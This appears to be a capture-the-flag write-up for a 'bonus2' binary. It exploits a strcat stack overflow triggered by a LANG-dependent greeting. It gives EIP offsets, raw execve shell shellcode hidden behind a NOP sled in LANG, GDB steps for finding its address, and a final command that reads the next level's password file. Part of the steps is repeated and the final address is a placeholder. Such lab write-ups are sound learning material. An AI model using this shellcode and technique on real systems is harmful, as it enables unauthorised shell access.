# Bonus2 Writeup

## Vulnerability Overview

**Type:** Stack buffer overflow via environment variable

**Core Issue:** The program checks the `LANG` environment variable and prepends 
a greeting to the user's input before copying it into a 64-byte buffer using 
`strcat`. If the greeting + input exceeds 64 bytes, it overflows into saved EIP.

## Program Structure

- `main()` copies argv[1] (max 40 bytes) and argv[2] (max 32 bytes) into a buffer
- Checks LANG: if "fi" → prepends "Hyvää päivää " (18 chars), if "nl" → prepends "Goedemiddag! " (13 chars)
- `greetuser()` concatenates greeting + buffer into 64-byte local buffer → OVERFLOW!

## Exploitation Strategy

1. Put shellcode inside LANG environment variable (after "nl" or "fi")
2. Fill argv[1] with 40 bytes padding
3. Fill argv[2] with padding + address pointing into LANG's NOP sled

## Offsets to EIP
- LANG=fi  → offset = 18 bytes
- LANG=nl  → offset = 23 bytes

## Steps

**1. Set LANG with shellcode:**
```bash
export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

**2. Find LANG address in GDB:**
```bash
gdb bonus2
b *main+125
run $(python -c 'print "A"*40') bla
x/20s *((char**)environ)
```
Look for LANG= line → note its address

**3. Calculate shellcode address:**
```
 LANG address (from GDB) = 0xbffffeb7(random address)
 7 bytes (skip "LANG=nl")
 50 bytes (land in middle of NOP sled)
 = 0xbffffee6
```

### Payload Structure

## Steps

**1. Set LANG with shellcode:**
```bash
export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

**2. Find LANG address in GDB:**
```bash
gdb bonus2
b *main+125
run $(python -c 'print "A"*40') bla
x/20s *((char**)environ)
```
Look for LANG= line → note its address

**3. Calculate shellcode address:**
LANG_address + 7 + 50

Convert to little-endian

after converting [address]

## Solution
```bash
export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "[addresss]"')
cat /home/user/bonus3/.pass
```
